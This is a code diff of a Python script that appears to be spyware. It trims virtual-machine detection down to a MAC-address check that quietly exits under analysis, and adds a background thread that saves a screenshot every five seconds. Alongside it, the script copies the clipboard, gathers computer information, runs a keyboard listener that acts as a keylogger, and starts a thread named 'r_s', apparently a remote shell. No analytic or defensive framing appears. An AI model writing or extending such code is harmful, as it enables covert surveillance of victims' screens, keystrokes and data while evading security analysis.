@@ -2,17 +2,13 @@
 # IMPORTS
 ########################################
 import os
-import sys
 import uuid
-import psutil
-import cpuinfo
 import ctypes
 import threading
 import pathlib
 import socketserver
 import http.server
 import requests
-import subprocess
 
 import time
 import socket
@@ -37,33 +33,11 @@ def check_mac_address():
         return True
     return False
 
-def check_vendor_string():
-    info = cpuinfo.get_cpu_info()
-    if 'vendor_id' not in info:
-        return False
-    vendor_string = info['vendor_id'].lower()
-    virtual_env_names = ['kvm', 'virtualbox', 'vmware', 'hyperv', 'parallels', 'xen', 'qemu']
-    for env_name in virtual_env_names:
-        if env_name in vendor_string:
-            return True
-    return False
-
-def check_virtualization():
-    try:
-        output = subprocess.check_output(['virt-what']).decode().strip()
-        if output:
-            return True
-        else:
-            return False
-    except (subprocess.CalledProcessError, FileNotFoundError):
-        return False
-
 def check_trusted_platform():
-    return not check_mac_address() and not check_vendor_string() and not check_virtualization()
+    return not check_mac_address()
 
 if not check_trusted_platform():
-    print("This script must be run on a trusted platform.")
-    sys.exit(1)
+    exit()
 else:
     pass
 
@@ -82,6 +56,9 @@ screen = "screen.png"
 dire = str(pathlib.Path().resolve())
 fil = dire.replace('\\','\\\\')
 extend = "\\"
+
+if not os.path.exists("screenshots"):
+    os.makedirs("screenshots")
 
 ########################################
 # get_ip
@@ -141,12 +118,27 @@ def copy_clipboard():
 ########################################
 
 def screenshot():
+    # Get the current time as a string to use as the filename
+    filename = time.strftime("%Y-%m-%d_%H-%M-%S.png")
+    # Take a screenshot and save it in the screenshots directory
     im = ImageGrab.grab()
-    im.save(fil + extend + screen)
-time.sleep(3)
+    im.save(os.path.join("screenshots", filename))
+    print(f"Screenshot taken and saved as {filename}")
 
+def take_screenshots_periodically(interval):
+    while True:
+        screenshot()
+        time.sleep(interval)
 
-screenshot()
+interval = 5
+
+t = threading.Thread(target=take_screenshots_periodically, args=(interval,))
+t.start()
+
+########################################
+# func
+########################################
+
 copy_clipboard()
 computer_information()
 
@@ -230,5 +222,5 @@ if __name__ == '__main__':
     thread = threading.Thread(target=r_s)
     thread.start()
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
+with Listener(on_press=on_press) as listener:
    listener.join()
